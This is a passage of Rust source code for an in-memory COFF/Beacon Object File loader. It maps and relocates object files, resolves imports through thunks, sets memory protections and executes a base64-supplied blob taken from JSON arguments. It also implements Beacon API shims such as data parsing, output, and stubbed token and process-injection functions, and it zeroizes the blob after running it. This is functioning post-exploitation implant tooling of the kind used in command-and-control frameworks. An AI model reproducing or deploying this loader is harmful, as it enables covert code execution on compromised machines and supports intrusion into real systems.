        idx += 1 + sym.aux_count as usize;
    }

    let thunk_offset = align_up(total_sections, PAGE_SIZE)?;
    let thunk_bytes = externals.len().checked_mul(THUNK_SIZE).ok_or(HostError::BadInput)?;
    let alloc_size = align_up(
        thunk_offset.checked_add(thunk_bytes).ok_or(HostError::BadInput)?,
        PAGE_SIZE,
    )?
    .max(PAGE_SIZE);

    let base = unsafe {
        (api.virtual_alloc)(
            null_mut(),
            alloc_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        ) as *mut u8
    };
    if base.is_null() {
        return Err(coff_error("alloc"));
    }
    let mapped = MappedImage { api, base, size: alloc_size };

    unsafe {
        std::ptr::write_bytes(mapped.base, 0, mapped.size);
    }

    for (idx, section) in sections.iter().enumerate() {
        if section.raw_size == 0 || section.raw_ptr == 0 {
            continue;
        }
        unsafe {
            copy_nonoverlapping(
                coff.as_ptr().add(section.raw_ptr as usize),
                mapped.base.add(section_offsets[idx]),
                section.raw_size as usize,
            );
        }
    }

    for (idx, ext) in externals.iter_mut().enumerate() {
        ext.thunk_offset = thunk_offset + idx * THUNK_SIZE;
        unsafe {
            write_thunk(mapped.base.add(ext.thunk_offset), ext.resolved);
        }
    }

    for (section_idx, section) in sections.iter().enumerate() {
        if section.reloc_count == 0 || section.reloc_ptr == 0 {
            continue;
        }
        for reloc_idx in 0..section.reloc_count as usize {
            let reloc_off = section.reloc_ptr as usize + reloc_idx * RELOCATION_SIZE;
            let rva = read_u32(coff, reloc_off)? as usize;
            let sym_idx = read_u32(coff, reloc_off + 4)? as usize;
            let reloc_type = read_u16(coff, reloc_off + 8)?;
            if sym_idx >= symbols.len() {
                continue;
            }
            let patch_offset = section_offsets[section_idx]
                .checked_add(rva)
                .ok_or(HostError::BadInput)?;
            if patch_offset + 8 > mapped.size {
                continue;
            }
            let patch = unsafe { mapped.base.add(patch_offset) };
            let sym = &symbols[sym_idx];
            let mut target: usize = 0;
            if sym.section_number > 0 {
                let target_section = (sym.section_number - 1) as usize;
                if target_section < sections.len() {
                    target = unsafe {
                        mapped
                            .base
                            .add(section_offsets[target_section] + sym.value as usize)
                    } as usize;
                }
            } else if sym.section_number == IMAGE_SYM_UNDEFINED
                && sym.storage_class == IMAGE_SYM_CLASS_EXTERNAL
            {
                if let Some(ext) = externals.iter().find(|e| e.symbol_index == sym_idx) {
                    target = unsafe { mapped.base.add(ext.thunk_offset + if ext.is_imp { 6 } else { 0 }) } as usize;
                }
            }

            if target == 0 && reloc_type != IMAGE_REL_AMD64_SECTION && reloc_type != IMAGE_REL_AMD64_SECREL {
                continue;
            }

            unsafe {
                match reloc_type {
                    IMAGE_REL_AMD64_ADDR64 => {
                        let p = patch as *mut u64;
                        *p = (*p).wrapping_add(target as u64);
                    }
                    IMAGE_REL_AMD64_ADDR32NB => {
                        let p = patch as *mut i32;
                        let delta = target as isize - mapped.base as isize;
                        *p = (*p).wrapping_add(delta as i32);
                    }
                    IMAGE_REL_AMD64_REL32
                    | IMAGE_REL_AMD64_REL32_1
                    | IMAGE_REL_AMD64_REL32_2
                    | IMAGE_REL_AMD64_REL32_3
                    | IMAGE_REL_AMD64_REL32_4
                    | IMAGE_REL_AMD64_REL32_5 => {
                        let p = patch as *mut i32;
                        let extra = (reloc_type - IMAGE_REL_AMD64_REL32) as isize;
                        let delta = target as isize - patch as isize - 4 - extra;
                        *p = (*p).wrapping_add(delta as i32);
                    }
                    IMAGE_REL_AMD64_SECTION => {
                        let p = patch as *mut u16;
                        if sym.section_number > 0 {
                            *p = sym.section_number as u16;
                        }
                    }
                    IMAGE_REL_AMD64_SECREL => {
                        let p = patch as *mut u32;
                        if sym.section_number > 0 {
                            *p = (*p).wrapping_add(sym.value);
                        }
                    }
                    _ => {}
                }
            }
        }
    }

    for (idx, section) in sections.iter().enumerate() {
        let sec_size = align_up(section_sizes[idx], PAGE_SIZE)?;
        if sec_size == 0 {
            continue;
        }
        let prot = if (section.characteristics & IMAGE_SCN_MEM_EXECUTE) != 0 {
            PAGE_EXECUTE_READ
        } else if (section.characteristics & IMAGE_SCN_MEM_WRITE) != 0 {
            PAGE_READWRITE
        } else {
            PAGE_READONLY
        };
        let mut old = 0u32;
        unsafe {
            (mapped.api.virtual_protect)(
                mapped.base.add(section_offsets[idx]).cast(),
                sec_size,
                prot,
                &mut old,
            );
        }
    }
    if thunk_bytes != 0 {
        let mut old = 0u32;
        unsafe {
            (mapped.api.virtual_protect)(
                mapped.base.add(thunk_offset).cast(),
                align_up(thunk_bytes, PAGE_SIZE)?,
                PAGE_EXECUTE_READ,
                &mut old,
            );
        }
    }
    unsafe {
        (mapped.api.flush_instruction_cache)(
            (mapped.api.get_current_process)(),
            mapped.base.cast(),
            mapped.size,
        );
    }

    let entry = symbols
        .iter()
        .find(|sym| {
            sym.section_number > 0
                && sym.storage_class == IMAGE_SYM_CLASS_EXTERNAL
                && sym.name == entry_name
        })
        .ok_or_else(|| coff_error("entry"))?;
    let entry_section = (entry.section_number - 1) as usize;
    if entry_section >= sections.len() {
        return Err(coff_error("entry"));
    }
    let entry_ptr = unsafe { mapped.base.add(section_offsets[entry_section] + entry.value as usize) };
    let entry_fn: BofEntryFn = unsafe { std::mem::transmute(entry_ptr) };
    unsafe {
        entry_fn(
            if args.is_empty() { null_mut() } else { args.as_mut_ptr() },
            args.len() as i32,
        );
    }

    Ok(0)
}

pub fn run(args: &serde_json::Value) -> Result<serde_json::Value> {
    let function = optional_string(args, "function").unwrap_or("go");
    let source = optional_string(args, "coff_source")
        .or_else(|| optional_string(args, "source"))
        .ok_or(HostError::BadInput)?;
    let source = source.to_ascii_lowercase();
    if !matches!(source.as_str(), "registered" | "new") {
        return Err(HostError::BadInput);
    }
    let mut coff = STANDARD.decode(optional_string(args, "coff_b64").ok_or(HostError::BadInput)?)?;
    let mut bof_args = packed_args(args)?;
    let function = CString::new(function).map_err(|_| HostError::BadInput)?;
    output_clear();
    let status = map_and_execute(&coff, &mut bof_args, function.as_bytes())?;
    let output = output_take();
    let output_len = output.len();
    let args_len = bof_args.len();
    coff.zeroize();
    bof_args.zeroize();

    Ok(json!({
        "status": status,
        "output": output,
        "output_len": output_len,
        "args_len": args_len
    }))
}

#[repr(C)]
struct DataP {
    original: *mut u8,
    buffer: *mut u8,
    length: i32,
    size: i32,
}

#[repr(C)]
struct FormatP {
    original: *mut u8,
    buffer: *mut u8,
    length: i32,
    size: i32,
}

extern "C" fn beacon_data_parse(parser: *mut DataP, buffer: *mut u8, size: i32) {
    if parser.is_null() {
        return;
    }
    unsafe {
        (*parser).original = buffer;
        if !buffer.is_null() && size >= 4 {
            (*parser).buffer = buffer.add(4);
            (*parser).length = size - 4;
            (*parser).size = size - 4;
        } else {
            (*parser).buffer = buffer;
            (*parser).length = size.max(0);
            (*parser).size = size.max(0);
        }
    }
}

extern "C" fn beacon_data_int(parser: *mut DataP) -> i32 {
    if parser.is_null() {
        return 0;
    }
    unsafe {
        if (*parser).length < 4 || (*parser).buffer.is_null() {
            return 0;
        }
        let value = *(*parser).buffer.cast::<i32>();
        (*parser).buffer = (*parser).buffer.add(4);
        (*parser).length -= 4;
        value
    }
}

extern "C" fn beacon_data_short(parser: *mut DataP) -> i16 {
    if parser.is_null() {
        return 0;
    }
    unsafe {
        if (*parser).length < 2 || (*parser).buffer.is_null() {
            return 0;
        }
        let value = *(*parser).buffer.cast::<i16>();
        (*parser).buffer = (*parser).buffer.add(2);
        (*parser).length -= 2;
        value
    }
}

extern "C" fn beacon_data_length(parser: *mut DataP) -> i32 {
    if parser.is_null() {
        0
    } else {
        unsafe { (*parser).length }
    }
}

extern "C" fn beacon_data_extract(parser: *mut DataP, size: *mut i32) -> *mut u8 {
    if parser.is_null() {
        return null_mut();
    }
    unsafe {
        if (*parser).length < 4 || (*parser).buffer.is_null() {
            if !size.is_null() {
                *size = 0;
            }
            return null_mut();
        }
        let len = *(*parser).buffer.cast::<i32>();
        (*parser).buffer = (*parser).buffer.add(4);
        (*parser).length -= 4;
        if len < 0 || len > (*parser).length {
            if !size.is_null() {
                *size = 0;
            }
            return null_mut();
        }
        let out = (*parser).buffer;
        (*parser).buffer = (*parser).buffer.add(len as usize);
        (*parser).length -= len;
        if !size.is_null() {
            *size = len;
        }
        out
    }
}

extern "C" fn beacon_format_alloc(format: *mut FormatP, maxsz: i32) {
    if format.is_null() || maxsz <= 0 {
        return;
    }
    let size = maxsz as usize;
    let mut buf = vec![0u8; size];
    let ptr = buf.as_mut_ptr();
    std::mem::forget(buf);
    unsafe {
        (*format).original = ptr;
        (*format).buffer = ptr;
        (*format).length = 0;
        (*format).size = maxsz;
    }
}

extern "C" fn beacon_format_reset(format: *mut FormatP) {
    if format.is_null() {
        return;
    }
    unsafe {
        if !(*format).original.is_null() && (*format).size > 0 {
            std::ptr::write_bytes((*format).original, 0, (*format).size as usize);
            (*format).buffer = (*format).original;
            (*format).length = 0;
        }
    }
}

extern "C" fn beacon_format_free(format: *mut FormatP) {
    if format.is_null() {
        return;
    }
    unsafe {
        if !(*format).original.is_null() && (*format).size > 0 {
            let size = (*format).size as usize;
            let _ = Vec::from_raw_parts((*format).original, size, size);
        }
        (*format).original = null_mut();
        (*format).buffer = null_mut();
        (*format).length = 0;
        (*format).size = 0;
    }
}

extern "C" fn beacon_format_append(format: *mut FormatP, text: *const u8, len: i32) {
    if format.is_null() || text.is_null() || len <= 0 {
        return;
    }
    unsafe {
        let available = (*format).size.saturating_sub((*format).length).max(0) as usize;
        let take = available.min(len as usize);
        if take != 0 {
            copy_nonoverlapping(text, (*format).buffer, take);
            (*format).buffer = (*format).buffer.add(take);
            (*format).length += take as i32;
        }
    }
}

extern "C" fn beacon_format_printf(
    format: *mut FormatP,
    fmt: *const u8,
    a1: usize,
    a2: usize,
    a3: usize,
    a4: usize,
    a5: usize,
    a6: usize,
    a7: usize,
    a8: usize,
    a9: usize,
    a10: usize,
) {
    let rendered = unsafe { render_format(fmt, &[a1, a2, a3, a4, a5, a6, a7, a8, a9, a10]) };
    beacon_format_append(format, rendered.as_ptr(), rendered.len() as i32);
}

extern "C" fn beacon_format_to_string(format: *mut FormatP, size: *mut i32) -> *mut u8 {
    if format.is_null() {
        return null_mut();
    }
    unsafe {
        if !size.is_null() {
            *size = (*format).length;
        }
        (*format).original
    }
}

extern "C" fn beacon_format_int(format: *mut FormatP, value: i32) {
    let swapped = (value as u32).swap_bytes().to_le_bytes();
    beacon_format_append(format, swapped.as_ptr(), 4);
}

extern "C" fn beacon_printf(
    _kind: i32,
    fmt: *const u8,
    a1: usize,
    a2: usize,
    a3: usize,
    a4: usize,
    a5: usize,
    a6: usize,
    a7: usize,
    a8: usize,
    a9: usize,
    a10: usize,
) {
    let rendered = unsafe { render_format(fmt, &[a1, a2, a3, a4, a5, a6, a7, a8, a9, a10]) };
    output_append(rendered.as_bytes());
}

fn next_fmt_arg(args: &[usize], idx: &mut usize) -> usize {
    let value = args.get(*idx).copied().unwrap_or(0);
    *idx = (*idx).saturating_add(1);
    value
}

extern "C" fn beacon_output(_kind: i32, data: *const u8, len: i32) {
    if data.is_null() || len <= 0 {
        return;
    }
    let slice = unsafe { std::slice::from_raw_parts(data, len as usize) };
    output_append(slice);
}

extern "C" fn beacon_use_token(_token: isize) -> i32 {
    0
}

extern "C" fn beacon_revert_token() {}

extern "C" fn beacon_is_admin() -> i32 {
    0
}

extern "C" fn beacon_get_spawn_to(_x86: i32, buffer: *mut u8, length: i32) {
    if !buffer.is_null() && length > 0 {
        unsafe {
            *buffer = 0;
        }
    }
}

extern "C" fn beacon_spawn_temporary_process(
    _x86: i32,
    _ignore_token: i32,
    _startup_info: *mut c_void,
    _process_info: *mut c_void,
) -> i32 {
    0
}

extern "C" fn beacon_inject_process(
    _process: isize,
    _pid: i32,
    _payload: *mut u8,
    _payload_len: i32,
    _payload_offset: i32,
    _arg: *mut u8,
    _arg_len: i32,
) {
}

extern "C" fn beacon_inject_temporary_process(
    _process_info: *mut c_void,
    _payload: *mut u8,
    _payload_len: i32,
    _payload_offset: i32,
    _arg: *mut u8,
    _arg_len: i32,
) {
}

extern "C" fn beacon_cleanup_process(_process_info: *mut c_void) {}

extern "C" fn to_wide_char(src: *const u8, dst: *mut u16, max: i32) -> i32 {
    if src.is_null() || dst.is_null() || max < 2 {
        return 0;
    }
    let input = unsafe { cstr_lossy(src) };
    let mut written = 0usize;
    let cap = (max as usize) / 2;
    for ch in input.encode_utf16().take(cap.saturating_sub(1)) {
        unsafe {
            *dst.add(written) = ch;
        }
        written += 1;
    }
    unsafe {
        *dst.add(written) = 0;
    }
    1
}

unsafe fn render_format(fmt: *const u8, args: &[usize]) -> String {
    if fmt.is_null() {
        return String::new();
    }
    let bytes = unsafe { cstr_bytes(fmt) };
    let mut out = String::new();
    let mut idx = 0usize;
    let mut arg_idx = 0usize;
    while idx < bytes.len() {
        if bytes[idx] != b'%' {
            out.push(bytes[idx] as char);
            idx += 1;
            continue;
        }
        idx += 1;
        if idx >= bytes.len() {
            break;
        }
        if bytes[idx] == b'%' {
            out.push('%');
            idx += 1;
            continue;
        }
        while idx < bytes.len() && matches!(bytes[idx], b'-' | b'+' | b' ' | b'#' | b'0') {
            idx += 1;
        }
        if idx < bytes.len() && bytes[idx] == b'*' {
            arg_idx += 1;
            idx += 1;
        } else {
            while idx < bytes.len() && bytes[idx].is_ascii_digit() {
                idx += 1;
            }
        }
        if idx < bytes.len() && bytes[idx] == b'.' {
            idx += 1;
            if idx < bytes.len() && bytes[idx] == b'*' {
                arg_idx += 1;
                idx += 1;
            } else {
                while idx < bytes.len() && bytes[idx].is_ascii_digit() {
                    idx += 1;
                }
            }
        }
        let mut wide = false;
        let mut longlong = false;
        if idx + 2 < bytes.len() && bytes[idx] == b'I' && bytes[idx + 1] == b'6' && bytes[idx + 2] == b'4' {
            longlong = true;
            idx += 3;
        } else if idx < bytes.len() && bytes[idx] == b'l' {
            idx += 1;
            wide = true;
            if idx < bytes.len() && bytes[idx] == b'l' {
                longlong = true;
                idx += 1;
            }
        } else if idx < bytes.len() && matches!(bytes[idx], b'h' | b'z' | b't') {
            idx += 1;
            if idx < bytes.len() && bytes[idx] == b'h' {
                idx += 1;
            }
        }
        if idx >= bytes.len() {
            break;
        }
        let spec = bytes[idx];
        idx += 1;
        match spec {
            b's' => {
                let ptr = next_fmt_arg(args, &mut arg_idx);
                if wide {
                    out.push_str(&unsafe { wide_lossy(ptr as *const u16) });
                } else {
                    out.push_str(&unsafe { cstr_lossy(ptr as *const u8) });
                }
            }
            b'S' => {
                let ptr = next_fmt_arg(args, &mut arg_idx);
                out.push_str(&unsafe { wide_lossy(ptr as *const u16) });
            }
            b'd' | b'i' => {
                let raw = next_fmt_arg(args, &mut arg_idx);
                if longlong {
                    out.push_str(&(raw as i64).to_string());
                } else {
                    out.push_str(&((raw as u32) as i32).to_string());
                }
            }
            b'u' => {
                let raw = next_fmt_arg(args, &mut arg_idx);
                if longlong {
                    out.push_str(&(raw as u64).to_string());
                } else {
                    out.push_str(&(raw as u32).to_string());
                }
            }
            b'x' => {
                let raw = next_fmt_arg(args, &mut arg_idx);
                if longlong {
                    out.push_str(&format!("{:x}", raw as u64));
                } else {
                    out.push_str(&format!("{:x}", raw as u32));
                }
            }
            b'X' => {
                let raw = next_fmt_arg(args, &mut arg_idx);
                if longlong {
                    out.push_str(&format!("{:X}", raw as u64));
                } else {
                    out.push_str(&format!("{:X}", raw as u32));
                }
            }
            b'p' => {
                let raw = next_fmt_arg(args, &mut arg_idx);
                out.push_str(&format!("0x{:x}", raw));
            }
            b'c' => {
                let raw = next_fmt_arg(args, &mut arg_idx);
                out.push((raw as u8) as char);
            }
            _ => {
                out.push('%');
                out.push(spec as char);
            }
        }
    }
    out
}

extern "C" fn compat_memcpy(dst: *mut c_void, src: *const c_void, len: usize) -> *mut c_void {
    if !dst.is_null() && !src.is_null() && len != 0 {
        unsafe { copy_nonoverlapping(src as *const u8, dst as *mut u8, len) };
    }
    dst
}

extern "C" fn compat_memmove(dst: *mut c_void, src: *const c_void, len: usize) -> *mut c_void {
    if !dst.is_null() && !src.is_null() && len != 0 {
        unsafe { copy(src as *const u8, dst as *mut u8, len) };
    }
    dst
}

extern "C" fn compat_memset(dst: *mut c_void, value: i32, len: usize) -> *mut c_void {
    if !dst.is_null() && len != 0 {
        unsafe { std::ptr::write_bytes(dst, value as u8, len) };
    }
    dst
}

extern "C" fn compat_strlen(value: *const u8) -> usize {
    unsafe { cstr_bytes(value).len() }
}

extern "C" fn compat_strcmp(a: *const u8, b: *const u8) -> i32 {
    unsafe { cmp_bytes(cstr_bytes(a), cstr_bytes(b), false, None) }
}

extern "C" fn compat_strncmp(a: *const u8, b: *const u8, n: usize) -> i32 {
    unsafe { cmp_bytes(cstr_bytes(a), cstr_bytes(b), false, Some(n)) }
}

extern "C" fn compat_stricmp(a: *const u8, b: *const u8) -> i32 {
    unsafe { cmp_bytes(cstr_bytes(a), cstr_bytes(b), true, None) }
}

unsafe fn cmp_bytes(a: &[u8], b: &[u8], ci: bool, limit: Option<usize>) -> i32 {
    let max = limit.unwrap_or(a.len().max(b.len()));
    for idx in 0..max {
        let ca = a.get(idx).copied().unwrap_or(0);
        let cb = b.get(idx).copied().unwrap_or(0);
        let ca = if ci { ca.to_ascii_lowercase() } else { ca };
        let cb = if ci { cb.to_ascii_lowercase() } else { cb };
        if ca != cb {
            return ca as i32 - cb as i32;
        }
        if ca == 0 {
            break;
        }
    }
    0
}

extern "C" fn compat_strcpy(dst: *mut u8, src: *const u8) -> *mut u8 {
    if dst.is_null() || src.is_null() {
        return dst;
    }
    unsafe {
        let bytes = cstr_bytes(src);
        copy_nonoverlapping(bytes.as_ptr(), dst, bytes.len());
        *dst.add(bytes.len()) = 0;
    }
    dst
}

extern "C" fn compat_strncpy(dst: *mut u8, src: *const u8, n: usize) -> *mut u8 {
    if dst.is_null() || src.is_null() || n == 0 {
        return dst;
    }
    unsafe {
        let bytes = cstr_bytes(src);
        let take = n.min(bytes.len());
        copy_nonoverlapping(bytes.as_ptr(), dst, take);
        if take < n {
            std::ptr::write_bytes(dst.add(take), 0, n - take);
        }
    }
    dst
}

extern "C" fn compat_strcat(dst: *mut u8, src: *const u8) -> *mut u8 {
    if dst.is_null() || src.is_null() {
        return dst;
    }
    unsafe {
        let dst_len = cstr_bytes(dst).len();
        let src_bytes = cstr_bytes(src);
        copy_nonoverlapping(src_bytes.as_ptr(), dst.add(dst_len), src_bytes.len());
        *dst.add(dst_len + src_bytes.len()) = 0;
    }
    dst
}

extern "C" fn compat_sprintf(
    dst: *mut u8,
    fmt: *const u8,
    a1: usize,
    a2: usize,
    a3: usize,
    a4: usize,
    a5: usize,
    a6: usize,
    a7: usize,
    a8: usize,
) -> i32 {
    if dst.is_null() {
        return -1;
    }
    let rendered = unsafe { render_format(fmt, &[a1, a2, a3, a4, a5, a6, a7, a8]) };
    unsafe {
        copy_nonoverlapping(rendered.as_ptr(), dst, rendered.len());
        *dst.add(rendered.len()) = 0;
    }
    rendered.len() as i32
}

extern "C" fn compat_snprintf(
    dst: *mut u8,
    size: usize,
    fmt: *const u8,
    a1: usize,
    a2: usize,
    a3: usize,
    a4: usize,
    a5: usize,
    a6: usize,
    a7: usize,
    a8: usize,
) -> i32 {
    if dst.is_null() || size == 0 {
        return -1;
    }
    let rendered = unsafe { render_format(fmt, &[a1, a2, a3, a4, a5, a6, a7, a8]) };
    let take = rendered.len().min(size.saturating_sub(1));
    unsafe {
        copy_nonoverlapping(rendered.as_ptr(), dst, take);
        *dst.add(take) = 0;
    }
    rendered.len() as i32
}

extern "C" fn compat_malloc(size: usize) -> *mut c_void {
    alloc_with_header(size)
}

extern "C" fn compat_calloc(count: usize, size: usize) -> *mut c_void {
    let total = count.saturating_mul(size);
    let ptr = alloc_with_header(total);
    if !ptr.is_null() {
        unsafe { std::ptr::write_bytes(ptr, 0, total) };
    }
    ptr
}

extern "C" fn compat_free(ptr: *mut c_void) {
    free_with_header(ptr)
}

extern "C" fn compat_realloc(ptr: *mut c_void, size: usize) -> *mut c_void {
    if ptr.is_null() {
        return alloc_with_header(size);
    }
    let new_ptr = alloc_with_header(size);
    if !new_ptr.is_null() {
        unsafe {
            let old_size = *((ptr as *mut u8).sub(std::mem::size_of::<usize>()) as *const usize);
            copy_nonoverlapping(ptr as *const u8, new_ptr as *mut u8, old_size.min(size));
        }
        free_with_header(ptr);
    }
    new_ptr
}

fn alloc_with_header(size: usize) -> *mut c_void {
    let header = std::mem::size_of::<usize>();
    let total = match size.checked_add(header) {
        Some(v) => v,
        None => return null_mut(),
    };
    let mut buf = vec![0u8; total];
    let raw = buf.as_mut_ptr();
    unsafe {
        *(raw as *mut usize) = size;
    }
    std::mem::forget(buf);
    unsafe { raw.add(header).cast() }
}

fn free_with_header(ptr: *mut c_void) {
    if ptr.is_null() {
        return;
    }
    let header = std::mem::size_of::<usize>();
    unsafe {
        let raw = (ptr as *mut u8).sub(header);
        let size = *(raw as *const usize);
        let _ = Vec::from_raw_parts(raw, size + header, size + header);
    }
}
